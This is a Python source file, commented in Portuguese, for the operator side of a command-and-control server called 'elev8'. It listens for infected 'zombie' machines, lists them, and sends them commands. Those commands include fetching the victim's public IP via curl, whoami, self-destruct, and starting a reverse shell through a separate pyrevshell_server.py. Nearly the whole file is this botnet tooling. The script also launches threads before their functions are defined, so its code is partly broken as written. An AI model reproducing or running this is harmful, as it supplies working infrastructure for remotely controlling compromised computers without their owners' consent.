import socket
import subprocess
import sys
import time
import threading
import asyncio
import io
import os
import psutil
import colorama
from colorama import Fore, Back, Style

exit_event = threading.Event()

counter = -1
clientlist = []
clientdata = []
automigrate = ""  # Variável para uso futuro
host = "0.0.0.0"  # Ouve em todas as interfaces de rede
port = 4545       # Porta para conexão

# Cria um socket TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(5)
print(Fore.YELLOW + "[+] listening on port " + str(port), Fore.WHITE)

# Inicia threads para funções principais
handler_thread = threading.Thread(target=init_main_sock)
handler_thread.daemon = True
handler_thread.start()

handler_thread = threading.Thread(target=server_selection)
handler_thread.daemon = True
handler_thread.start()

while True:
    time.sleep(1)

# Função para inicializar o socket principal
def init_main_sock():
    while True:
        conn, addr = s.accept()
        print(Fore.GREEN, f'\n[*] Accepted new connection from: {addr[0]}:{addr[1]} !!!', Fore.WHITE)
        client_sock_handle = conn.fileno()  # Obtém o número do identificador do socket do cliente
        print(f"Client socket handle: {client_sock_handle}")
        
        global counter
        global automigrate  # Não utilizado ainda
        counter += 1  # Incrementa o contador de clientes conectados
        
        # Recebe informações do cliente
        clientinfo = conn.recv(1024)
        clientinfo = clientinfo.decode('UTF-8').split("\n")
        
        # Armazena as informações do cliente
        UserInfo = clientinfo[0]
        clientlist.append([counter, conn, UserInfo])
        clientdata.append(clientinfo)
        
        # Inicia uma thread para monitorar o cliente
        handler_thread = threading.Thread(target=probe)
        handler_thread.daemon = True
        handler_thread.start()

# Função para seleção de comandos do servidor
def server_selection():
    global clientlist
    commands = "True"
    
    while not "exit" in commands:
        command = input(Fore.CYAN + "<< elev8 >> $ " + Fore.WHITE)
        if command == "":
            pass
        if command == "zombies":  # Interage com um zumbi/agente
            zombies()
        if command == "cls" or command == "clear":  # Limpa o console
            os.system("cls" if os.name == 'nt' else "clear")
        if command == "?" or command == "help":  # Exibe ajuda
            print(Fore.YELLOW + "commands:\n$ zombies\n$ clear/cls (clears screen)\n$ control + C kills server\n" + Fore.WHITE)

# Função para iniciar o servidor de shell reverso
def startrevshellsvr():
    if os.name == 'nt':  # Windows
        subprocess.call(["py", "pyrevshell_server.py"])
    else:  # Linux
        subprocess.call(["python3", "pyrevshell_server.py"])
    exit_event.set()

# Função para monitorar a saúde dos clientes
def probe():
    while True:
        global counter
        global clientlist
        global clientdata
       
        try:
            for c in range(len(clientlist)):
                clientlist[c][1].send(b"?keepalive?\n")  # Envia sinal de keep-alive
        except:
            print(Fore.YELLOW + "\nThis Zombie died:\n************************\n" + Fore.WHITE, counter, "--> ", clientdata[c], "\n************************\n")
            clientlist.pop(c)
            clientdata.pop(c)
            counter -= 1
            print(Fore.GREEN + "[+] removed \"dead\" zombie ;) " + Fore.WHITE)
        time.sleep(4)

# Função para interagir com os zumbis
def zombies():
    global counter
    global clientlist
    global clientdata
    
    if len(clientlist) <= 0:
        print(Fore.RED + "[!] no zombies yet..." + Fore.WHITE)
        return
        
    print(Fore.GREEN + "Zombies: ", len(clientlist), Fore.WHITE)

    for temp, b in enumerate(clientdata):
        print("Zombie: ", temp, "-->", b)
    
    print(Fore.GREEN + "\nPick a zombie to interact with!\n" + Fore.WHITE)
    try:
        selection = int(input(' <enter the client #> $ '))
    except:
        print(Fore.RED + "[!] enter client number..." + Fore.WHITE)
        time.sleep(2)
        return 
    
    while True:
        os.system("cls" if os.name == 'nt' else "clear")
        print(Fore.GREEN)
        print("what would you like to do?")
        print("1. Send a Message")
        print("2. Get user info")
        print("3. Get public ip")
        print("4. Kill Zombie")
        print("5. Start a Shell!")
        print("6. Whoami")
        print("15. Main menu")
        print(Fore.WHITE)
        
        try:
            choice = input(Fore.YELLOW + "[Select a number]: $ " + Fore.WHITE)
        except:    
            print(Fore.RED + "[!] enter a number..." + Fore.WHITE)
            time.sleep(2)
            return            
        
        if choice == "1":
            try:
                clientlist[selection][1].send(b":msg:\nhey from the server!\n")
                print(Fore.GREEN + "[+] Message Sent!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] there was an error sending the msg to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        
        if choice == "2":
            for a in clientdata[selection]:
                print(a)
            input()
        
        if choice == "3":
            try:
                clientlist[selection][1].send(b"c0mm@nd\ncurl ifconfig.me\n")
                print(Fore.GREEN + "[+] command sent!" + Fore.WHITE)
                pubip = clientlist[selection][1].recv(1024)
                pubip = pubip.decode('UTF-8')
                print(pubip)
                input("press any key...")
            except:
                print(Fore.RED + "[!] there was an error sending the command to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        
        if choice == "4":
            try:
                clientlist[selection][1].send(b"self-destruct\n")
                print(Fore.GREEN + "[+] zombie self-destruct succeeded!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] There was an issue communicating with the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        
        if choice == "5":
            exit_event.clear()
            handler_thread = threading.Thread(target=startrevshellsvr)
            handler_thread.daemon = True
            handler_thread.start()
            print("[+] starting shell in 2 seconds!")
            time.sleep(2)
            clientlist[selection][1].send(b":shell:\n")
            while not exit_event.is_set():
                time.sleep(1)
            return
        
        if choice == "6":
            clientlist[selection][1].send(b":whoami:\n")
            whoami = clientlist[selection][1].recv(1024)
            whoami = whoami.decode('UTF-8')
            print("You are: ", whoami)
            time.sleep(2)

        if choice == "15":
            return
